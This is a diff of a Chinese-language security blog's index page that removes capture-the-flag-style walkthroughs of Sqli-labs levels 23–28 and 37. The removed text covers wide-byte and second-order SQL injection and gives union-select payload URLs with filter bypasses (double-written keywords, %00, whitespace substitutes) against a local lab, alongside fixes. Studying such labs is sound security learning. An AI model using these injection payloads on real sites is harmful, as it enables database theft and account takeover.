-<p><code>mysql_real_escape_string()</code>函数转义 SQL 语句中使用的字符串中的特殊字符<br>下列字符受影响：</p>
-<pre><code>\x00
-\n
-\r
-\
-&apos;
-&quot;
-\x1a
-</code></pre><p>如果成功，则该函数返回被转义的字符串。如果失败,则返回false。<br>注意:在使用<code>mysql_real_escape_string()</code>时,需要将<code>mysql</code>设置为<code>gbk</code>:<code>Mysql_set_charset(&#39;gbk&#39;,&#39;$conn&#39;)</code></p>
-<h3 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h3><p>利用方式与less-34无异<br>代码与less-34的区别是post内容用的是<code>mysql_real_escape_string()</code>函数进行处理的,而不是<code>addslashes()</code>函数,但是原理是一样的.利用方式也相同。</p>
-<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>出现宽字节的原因是在PHP连接mysql时执行了如下设置:</p>
-<pre><code>set character_set_client=gbk
-</code></pre><p>这句代码是告诉mysql服务器,客户端传过来的数据是gbk编码的,然后mysql服务器对查询语句进行gbk编码导致反斜杠\被<code>%df</code>吃掉,但是一般网站都不这么设置,通常的设置方法是:<code>set names &#39;gbk&#39;</code>,但是实际上这行代码不过是比<code>set character_set_client</code>多干了两件事而已,set names ‘gbk’等同于如下代码:<br><code>set character_set_connection=&#39;gbk&#39; character_set_results=&#39;gbk&#39; character_set_client=gbk</code>。<br>代码意思是:mysql服务器接收客户端数据,认为他的编码是<code>character_set_client</code>,然后将其转化为<code>character_set_connection</code>的编码,然后进入表及字段,转化为字段对应编码,执行完sql语句返回的结果转成<code>character_set_results</code>编码,返回客户端。</p>
-<h4 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法:"></a>修复方法:</h4><blockquote>
-<p><strong>A</strong>.所有sql语句前指定一下连接的形式是二进制:set names ‘gbk’,character_set_client=binary或者直接(SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary)<br>    <strong>B</strong>.先调用mysql_set_charset(‘gbk’)设置连接所使用的字符集为gbk,然后使用mysql_real_escape_string()来过滤用户输入。<br>    <strong>C</strong>.使用PDO模式,在PHP5.3.6及以下版本,需要设置serAttribute(PDO::ATTR_EMULATE_PREPARES,false);来禁用prepare statements的仿真效果(本地模拟预处理),这个在之前复现TP框架的洞时有涉及:<br>    <a href="https://p0rz9.github.io/2018/09/19/ThinkPHP%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E6%B3%84%E9%9C%B2%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81+%E9%B8%A1%E8%82%8Bsql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">ThinkPHP5.x设计缺陷泄露账户密码+鸡肋sql注入</a>         </p>
-</blockquote>
-<p>但是还存在一种特殊情况,就是<code>iconv()</code>的错误使用导致上面的方法前功尽弃,例如：很多cms使用<code>iconv(&#39;utf-8&#39;, &#39;gbk&#39;, $_GET[&#39;word&#39;]);</code>来转换编码,目的是避免乱码。但是在utf-8转向gbk或者在gbk转向utf-8时,会多处一个%5c将转义符(反斜杠)转义,造成后面的单引号逃逸,也会造成注入。</p>
-<h4 id="CMS挖掘"><a href="#CMS挖掘" class="headerlink" title="CMS挖掘:"></a>CMS挖掘:</h4><p>挖掘宽字节注入的方法也比较简单,只要搜索如下几个关键字即可:</p>
-<pre><code>set names
-character_set_client=gbk
-mysql_set_charset(&apos;gbk&apos;)
-iconv(
-</code></pre>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/30/Sqli-labs Less23-28/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/30/Sqli-labs Less23-28/" itemprop="url">Sqli-labs Less23-28</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-30T08:15:42+08:00">
-                2018-10-30
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h3 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h3><pre><code>http://127.0.0.1:86/less-23/index.php?id=1&apos;  报错
-http://127.0.0.1:86/less-23/index.php?id=1&apos;%23    报错
-http://127.0.0.1:86/less-23/index.php?id=1&apos;--+ 报错
-http://127.0.0.1:86/less-23/index.php?id=1&apos;&apos; 正确
-</code></pre><p>猜想是后台过滤了这2种注释字符,但是我们可以用<code>&#39;1&#39;=&#39;1</code>闭合后面的<code>&#39;</code>。</p>
-<p>这里可利用联合注入,报错注入,延时注入,我们以联合注入为例:</p>
-<pre><code>http://127.0.0.1:86/less-23/index.php?id=-1&apos; union select 1,2,3 and &apos;1&apos;=&apos;1        
-</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.09.16.43-image.png" alt="2018-10-30.09.16.43-image.png"></p>
-<pre><code>http://127.0.0.1:86/less-23/index.php?id=-1&apos; union select 1,database(),3 and &apos;1&apos;=&apos;1
-</code></pre><p>然后将<code>database()</code>处更换为其他查询语句即可。<br>less-23过滤id的代码:</p>
-<pre><code>$reg = &quot;/#/&quot;;
-$reg1 = &quot;/--/&quot;;
-$replace = &quot;&quot;;
-$id = preg_replace($reg, $replace, $id);
-$id = preg_replace($reg1, $replace, $id);
-</code></pre><h3 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h3><p>这一关是关于二次注入的,二次注入也称为存储型的注入,就是将可能导致sql注入的字符先存储到数据库中,当再次调用这个恶意构造的字符时,就会触发sql注入。</p>
-<p>这个例子大致过程:注册一个含有恶意字符(构造sql语句)的用户名(<code>admin&#39;#</code>)—-&gt;存储到数据库中——&gt;修改密码时,调用恶意字符导致修改了用户admin的密码<br>n注册账户admin’#  密码:123456<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.09.55.00-image.png" alt="2018-10-30.09.55.00-image.png"></p>
-<p>查看数据库:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.09.58.25-image.png" alt="2018-10-30.09.58.25-image.png"></p>
-<p>登陆后跳转到更改密码的页面,我们更改密码为test:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.09.59.01-image.png" alt="2018-10-30.09.59.01-image.png"></p>
-<p>查看数据库:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.09.59.57-image.png" alt="2018-10-30.09.59.57-image.png"></p>
-<p>我们发现我们刚才注册的账号<code>admin&#39;#</code>的密码并未改变,却改变了admin的密码<br>查看源码:</p>
-<pre><code>$curr_pass= mysql_real_escape_string($_POST[&apos;current_password&apos;]);
-$pass= mysql_real_escape_string($_POST[&apos;password&apos;]);
-$re_pass= mysql_real_escape_string($_POST[&apos;re_password&apos;]);
-
-if($pass==$re_pass)
-{    
-    $sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;
-</code></pre><p>看代码我们就能理解了,刚才咱们提交修改<code>admin&#39;#</code>后,执行的sql语句是:</p>
-<pre><code>UPDATE users SET PASSWORD=&apos;test&apos; where username=&apos;admin&apos;#&apos; and password=&apos;123456&apos;
-</code></pre><p> 因为#注释掉了后面的内容,所以只执行了前面的语句,将admin的密码修改为test</p>
-<h3 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h3><p> 访问less-25的地址:<br> <img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.10.53.14-image.png" alt="2018-10-30.10.53.14-image.png"></p>
-<p> 大概意思就是:and or被过滤,然后下面写出了过滤后的字符串。面对关键字被过滤的情况,我们可利用:</p>
-<pre><code>1.大小写绕过    AND AnD ANd And aNd aND anD Or oR OR等  
-2.双写绕过        anandd oorr
-3.编码绕过        hex urlencode
-4.特殊字符        an%00d o%00r
-5.利用符号绕过   and=&amp;&amp; or=||
-6.内联注释绕过  /*!and*/
-</code></pre><p>大小写不可以</p>
-<p>双写可以绕过:</p>
-<pre><code>http://127.0.0.1:86/less-25/index.php?id=1&apos; anandd &apos;1&apos;=&apos;1    
-</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.10.54.56-image.png" alt="2018-10-30.10.54.56-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.12.09.50-image.png" alt="2018-10-30.12.09.50-image.png"></p>
-<p>编码绕过:(绕不过)</p>
-<pre><code>%25%36%31%25%36%45%25%36%34
-http://127.0.0.1:86/less-25/index.php?id=1&apos; %25%36%31%25%36%45%25%36%34 &apos;1&apos;=&apos;1    
-</code></pre><p>插入%00绕过</p>
-<pre><code>http://127.0.0.1:86/less-25/index.php?id=1&apos; an%00d &apos;1&apos;=&apos;1
-</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.12.03.45-image.png" alt="2018-10-30.12.03.45-image.png"></p>
-<p>注:在数据库中 插入<code>/**/</code>也可绕过,但是在实际利用不可以  原因不详。。。。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.12.13.01-image.png" alt="2018-10-30.12.13.01-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.12.14.22-image.png" alt="2018-10-30.12.14.22-image.png"></p>
-<p>利用符号绕过:（&amp;&amp;会被url当成参数分隔符 <code>||</code>可利用）<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.12.06.47-image.png" alt="2018-10-30.12.06.47-image.png"></p>
-<p>我们这里使用双写绕过方法进行演示,注入的方法可以为联合,报错与延时,这里以联合注入为例:</p>
-<pre><code>#显示报错位:
-http://127.0.0.1:86/less-25/index.php?id=-1&apos; union select 1,2,3 anandd &apos;1&apos;=&apos;1 
-
-#得到数据库名
-http://127.0.0.1:86/less-25/index.php?id=-1&apos; union select 1,database(),3 anandd &apos;1&apos;=&apos;1 
-</code></pre><p>接下来注入即可。</p>
-<p>less-25过滤<code>id</code>的代码:</p>
-<pre><code>function blacklist($id)
-{
-    $id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);            //strip out OR (non case sensitive)
-    $id= preg_replace(&apos;/AND/i&apos;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)
-
-    return $id;
-}
-</code></pre><h3 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h3><p>与less-25类似,只是sql语句是直接拼接<code>$id</code>且关闭了报错,所以把闭合符号<code>&#39;</code>去掉用联合或者延时注入即可。</p>
-<hr>
-<h3 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h3><p>过滤函数:</p>
-<pre><code>function blacklist($id)
-{
-    $id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);            //strip out OR (non case sensitive)
-    $id= preg_replace(&apos;/and/i&apos;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)
-    $id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);        //strip out /*
-    $id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);        //Strip out --
-    $id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);            //Strip out #
-    $id= preg_replace(&apos;/[\s]/&apos;,&quot;&quot;, $id);        //Strip out spaces
-    $id= preg_replace(&apos;/[\/\\\\]/&apos;,&quot;&quot;, $id);        //Strip out slashes
-    return $id;
-}
-</code></pre><p>过滤掉了<code>or and /* -- # 所有空白字符 \</code>等字符<br>对于or与and被过滤的处理方法,见less-25,对于注释符的过滤,见less-23,对于空格,可用下方的字符代替:</p>
-<pre><code>/**/   注释符   被过滤
-%09    TAB键（水平）
-%0a    新建一行
-%0b    TAB键（垂直）
-%0c    新的一页
-%0d    return功能
-%a0    空格
-</code></pre><p>可在<code>linux</code>下尝试是否能成功,这里没搭建,先占个坑</p>
-<h3 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h3><p>相比于less-26,闭合符换为了<code>&#39;)</code>且关闭了报错,使用联合或延时注入即可。</p>
-<h3 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h3><p>查看源代码：</p>
-<pre><code>function blacklist($id)
-{
-$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);        //strip out /*
-$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);        //Strip out --.
-$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);            //Strip out #.
-$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);        //Strip out spaces.
-$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);        //Strip out spaces.
-$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);        //Strip out spaces.
-$id= preg_replace(&apos;/union/s&apos;,&quot;&quot;, $id);        //Strip out union
-$id= preg_replace(&apos;/select/s&apos;,&quot;&quot;, $id);        //Strip out select
-$id= preg_replace(&apos;/UNION/s&apos;,&quot;&quot;, $id);        //Strip out UNION
-$id= preg_replace(&apos;/SELECT/s&apos;,&quot;&quot;, $id);        //Strip out SELECT
-$id= preg_replace(&apos;/Union/s&apos;,&quot;&quot;, $id);        //Strip out Union
-$id= preg_replace(&apos;/Select/s&apos;,&quot;&quot;, $id);        //Strip out Select
-return $id;
-}
-</code></pre><p>发现在前面的基础上过滤了<code>union select</code>等敏感字符,使用双写或大小写混淆即可绕过。</p>
-<h3 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h3><p>相比于less-27,直接拼接<code>$id</code>,所以不需要闭合符去闭合且关闭了报错,用联合或延时注入即可。</p>
-<h3 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h3><p>对比less-27,闭合符号由<code>&#39;</code>变为<code>&#39;）</code>且关闭报错与过滤条件少了select,使用联合或延时注入即可</p>
-<h3 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h3><p>对比less-28,只是少了几个过滤条件,使用联合或延时注入即可</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -3561,7 +3690,7 @@ return $id;
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-count">51</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
